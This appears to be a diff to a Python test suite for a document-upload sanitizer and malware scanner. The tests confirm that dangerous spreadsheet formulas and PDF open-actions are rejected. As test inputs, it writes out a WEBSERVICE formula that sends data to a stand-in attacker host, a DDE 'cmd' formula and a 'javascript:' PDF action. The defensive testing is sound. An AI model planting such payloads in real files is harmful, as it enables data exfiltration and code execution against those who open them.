@@ -185,9 +185,70 @@ def test_formula_dde_do_excel_e_recusada_e_formula_comum_nao():
         sanitize(
             pacote(office.XLSX, conteudo=b"<c><f>cmd|'/c calc'!A1</f></c>"), office.XLSX
         )
+    for formula in (
+        b'<c><f>WEBSERVICE("http://attacker.test/exfil")</f></c>',
+        b'<c><f>FILTERXML(WEBSERVICE("https://x.test"), "//a")</f></c>',
+        b'<c><f>RTD("progid",,"topic")</f></c>',
+    ):
+        with pytest.raises(InvalidFile):
+            sanitize(pacote(office.XLSX, conteudo=formula), office.XLSX)
     assert sanitize(
         pacote(office.XLSX, conteudo=b"<c><f>SUM(A1:A9)</f></c>"), office.XLSX
     )
+
+
+def test_scanner_rejeita_openaction_e_aa_perigosos_em_pdf_e_relata_saude_clamav(
+    monkeypatch,
+):
+    import asyncio
+
+    from pypdf import PdfWriter
+    from pypdf.generic import DictionaryObject, NameObject, TextStringObject
+
+    from api.core.config import settings
+    from api.modules.materials import av, scanner
+
+    writer = PdfWriter()
+    writer.add_blank_page(width=200, height=200)
+    writer._root_object[NameObject("/OpenAction")] = DictionaryObject(
+        {
+            NameObject("/S"): NameObject("/URI"),
+            NameObject("/URI"): TextStringObject("javascript:alert(1)"),
+        }
+    )
+    buf = BytesIO()
+    writer.write(buf)
+    with pytest.raises(scanner.ScanRejected) as erro:
+        scanner.scan_raw(buf.getvalue(), "application/pdf")
+    assert erro.value.reason_code == "pdf_dangerous_uri"
+
+    monkeypatch.setattr(settings, "clamav_host", None)
+    assert asyncio.run(av.health()) == {"configured": False, "state": "disabled"}
+
+    monkeypatch.setattr(settings, "clamav_host", "127.0.0.1")
+
+    class _Reader:
+        async def readuntil(self, _sep):
+            return b"PONG\x00"
+
+    class _Writer:
+        def write(self, _data):
+            pass
+
+        async def drain(self):
+            pass
+
+        def close(self):
+            pass
+
+        async def wait_closed(self):
+            pass
+
+    async def _ok(_host, _port):
+        return _Reader(), _Writer()
+
+    monkeypatch.setattr(av.asyncio, "open_connection", _ok)
+    assert asyncio.run(av.health())["state"] == "healthy"
 
 
 @pytest.mark.parametrize("nome", ["../fora.xml", "/abs.xml", "c:/x.xml"])
